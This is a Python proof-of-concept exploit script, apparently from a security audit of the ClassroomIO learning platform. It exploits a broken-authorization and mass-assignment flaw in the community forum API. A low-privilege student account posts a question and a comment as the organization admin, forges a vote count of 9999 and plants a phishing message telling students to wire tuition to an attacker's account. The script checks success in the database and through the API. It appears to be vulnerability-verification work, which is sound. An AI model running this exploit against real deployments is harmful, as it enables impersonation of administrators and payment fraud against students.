#!/usr/bin/env python3
"""
VULN-002 (F-11) — Community forum BOLA / mass-assignment: post & comment AS ANY USER
with forged votes.

Vulnerable code (targets/classroomio/):
  * route:   apps/api/src/routes/community/community.ts:70-88   (POST /community)
  * route:   apps/api/src/routes/community/community.ts:120-144 (POST /:id/comment)
  * service: apps/api/src/services/community.ts:102-145 (createQuestion — body fields verbatim)
  * service: apps/api/src/services/community.ts:162-185 (createComment — votes verbatim)
  * query:   packages/db/src/queries/community/community.ts:133-155,199-221
  * schema:  packages/db/src/schema.ts (community_question.author_profile_id -> profile.id)

Class: CWE-639 / CWE-284 broken object-level authorization + mass-assignment (author spoofing).

The flaw: POST /community is gated only by orgMemberMiddleware (header org), then forwards the
body's `authorProfileId`, `organizationId`, `votes`, `slug` straight into the insert. The service
never reconciles `authorProfileId` with the authenticated session (`c.get('user')`). So any org
member posts a question/comment attributed to ANY user id they name. `POST /:id/comment` is the
same shape and additionally honors a client-supplied `votes` count verbatim (the question insert
hardcodes votes:0, so vote forgery lands on the comment path).

Exploitation idea: as a self-registered STUDENT, POST /community with authorProfileId = the ADMIN's
profile id; the forum then shows the post authored by the admin. Add a forged comment with
votes=9999 attributed to the admin.

A successful run proves: a low-privilege STUDENT persisted a community post + comment attributed to
a DIFFERENT user (the org ADMIN) and forged the comment's vote count — impersonation with integrity
impact, verified in the DB and by reading the post back through the API.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (log, banner, verdict, admin_login, make_student,  # noqa: E402
                     ORG_ID, rid, psql)

VULN = "VULN-002"
HERE = os.path.dirname(os.path.abspath(__file__))


def free_seats(profile_ids):
    """Archive org-membership for the test students THIS run created (keeps the Free-plan
    20-student seat count bounded so the exploit stays re-runnable). Only touches the exact
    ids created here — never other concurrent runs' accounts."""
    ids = ",".join(f"'{p}'" for p in profile_ids if p)
    if not ids:
        return
    psql(f"update organizationmember set status='ARCHIVED', status_changed_at=now() "
         f"where organization_id='{ORG_ID}' and role_id=3 and profile_id in ({ids});")
    log("INFO", f"cleanup: archived {len([p for p in profile_ids if p])} test-student seat(s) created this run")


def main():
    banner(VULN, "Community BOLA — post/comment as any user + forged votes")
    log("INFO", "route apps/api/src/routes/community/community.ts:70-88 (orgMemberMiddleware only)")
    log("INFO", "service community.ts:102-145 inserts body authorProfileId/organizationId/slug verbatim")

    # --- Preconditions: an org ADMIN (the impersonation victim) + a self-registered STUDENT ---
    log("SETUP", "admin login (the impersonation VICTIM)")
    admin = admin_login()
    victim_id = admin.user["id"]  # profile.id == user.id (schema.ts profile_id_fkey -> user.id)
    log("SETUP", f"victim ADMIN profile id = {victim_id}")

    log("SETUP", "provision a low-privilege STUDENT (self-register + accept course share link)")
    student, info = make_student(admin)
    course_id = info["course_id"]
    attacker_id = info["user_id"]
    log("SETUP", f"attacker STUDENT profile id = {attacker_id} role_in_org={info['role_in_org']} (3=STUDENT)")
    if attacker_id == victim_id:
        verdict(VULN, "FAILED", "attacker == victim; cannot demonstrate spoofing")
        sys.exit(1)

    # --- Attack step 1: create a question AS THE ADMIN, with forged votes ---
    slug = rid("notice")
    marker = rid("body")
    q_body = {
        "slug": slug,
        "title": "OFFICIAL: mandatory payment portal",
        "body": f"Wire tuition to attacker-controlled account. marker={marker}",
        "courseId": course_id,
        "organizationId": ORG_ID,
        "authorProfileId": victim_id,   # <-- forged: the ADMIN, not the attacker
        "votes": 9999,                  # <-- forged (question insert hardcodes 0; kept to show intent)
    }
    log("STEP", f"as STUDENT {attacker_id}: POST /community authorProfileId={victim_id} (the ADMIN) slug={slug}")
    r = student.post("/community", org=True, json=q_body)
    log("INFO", f"  response: HTTP {r.status_code} {r.text[:220]}")
    with open(os.path.join(HERE, "request.http"), "w") as f:
        f.write("POST /community HTTP/1.1\n")
        f.write("Host: localhost:21527\n")
        f.write("Content-Type: application/json\n")
        f.write(f"cio-org-id: {ORG_ID}\n")
        f.write("Cookie: classroomio.session_token=<STUDENT session>\n\n")
        import json as _j
        f.write(_j.dumps(q_body, indent=2) + "\n")
    with open(os.path.join(HERE, "response.txt"), "w") as f:
        f.write(f"POST /community  (STUDENT session {attacker_id}; authorProfileId forged to ADMIN {victim_id})\n")
        f.write(f"HTTP {r.status_code}\n\n{r.text}\n")

    if r.status_code != 201:
        verdict(VULN, "FAILED", f"POST /community returned {r.status_code}")
        log("FAIL", "question was not created")
        sys.exit(1)

    created = r.json().get("data", {})
    qid = created.get("id")
    log("INFO", f"  created question id={qid} authorId(returned)={created.get('authorId')}")

    # --- Ground truth: DB row author + read-back through the API ---
    db_author = psql(f"select author_profile_id from community_question where slug='{slug}';")
    db_votes = psql(f"select coalesce(votes,0) from community_question where slug='{slug}';")
    log("PROOF", f"DB community_question.author_profile_id = {db_author}  (attacker session was {attacker_id})")
    log("INFO", f"DB community_question.votes = {db_votes}  (question insert hardcodes 0 — see query :199-221)")

    r2 = student.get(f"/community/{slug}", org=True)
    read_author = None
    read_name = None
    if r2.status_code == 200:
        d = r2.json().get("data", {})
        read_author = d.get("authorId")
        read_name = d.get("authorFullname")
        log("PROOF", f"GET /community/{slug} shows authorId={read_author} authorFullname={read_name!r}")
    with open(os.path.join(HERE, "response.txt"), "a") as f:
        f.write(f"\n\nGET /community/{slug}  (read-back)\nHTTP {r2.status_code}\n\n{r2.text}\n")

    spoof_ok = (db_author == victim_id) and (read_author == victim_id) and (attacker_id != victim_id)

    # --- Attack step 2: forge a COMMENT authored by the ADMIN with votes=9999 (votes stick here) ---
    c_body = {"body": f"Forged endorsement by admin marker={marker}", "authorProfileId": victim_id, "votes": 9999}
    log("STEP", f"as STUDENT: POST /community/{qid}/comment authorProfileId={victim_id} votes=9999")
    rc = student.post(f"/community/{qid}/comment", org=True, json=c_body)
    log("INFO", f"  response: HTTP {rc.status_code} {rc.text[:200]}")
    comment_ok = False
    if rc.status_code == 201:
        cdata = rc.json().get("data", {})
        cvotes = cdata.get("votes")
        cauthor = cdata.get("authorId")
        db_c = psql(f"select author_profile_id||'|'||coalesce(votes,0) from community_answer where question_id={qid} order by created_at desc limit 1;")
        log("PROOF", f"comment returned author={cauthor} votes={cvotes}; DB(author|votes)={db_c}")
        comment_ok = (str(cvotes) == "9999") and (cauthor == victim_id)
        with open(os.path.join(HERE, "response.txt"), "a") as f:
            f.write(f"\n\nPOST /community/{qid}/comment (forged author+votes)\nHTTP {rc.status_code}\n\n{rc.text}\n")

    free_seats([attacker_id])

    if spoof_ok:
        log("PROOF", f"STUDENT {attacker_id} published a community post attributed to ADMIN {victim_id} "
                     f"(DB + API read-back agree) — author spoofing / BOLA confirmed")
        if comment_ok:
            log("PROOF", "and a comment attributed to the ADMIN with a forged vote count of 9999 (mass-assignment)")
        verdict(VULN, "CONFIRMED",
                "STUDENT posts community content as the ADMIN (forged authorProfileId)"
                + ("; comment votes also forged" if comment_ok else ""))
        log("OK", "exploit confirmed — impersonation + mass-assignment on the community write path")
        sys.exit(0)

    verdict(VULN, "FAILED", f"db_author={db_author} read_author={read_author} victim={victim_id}")
    log("FAIL", "authorProfileId was not honored from the body")
    sys.exit(1)


if __name__ == "__main__":
    main()
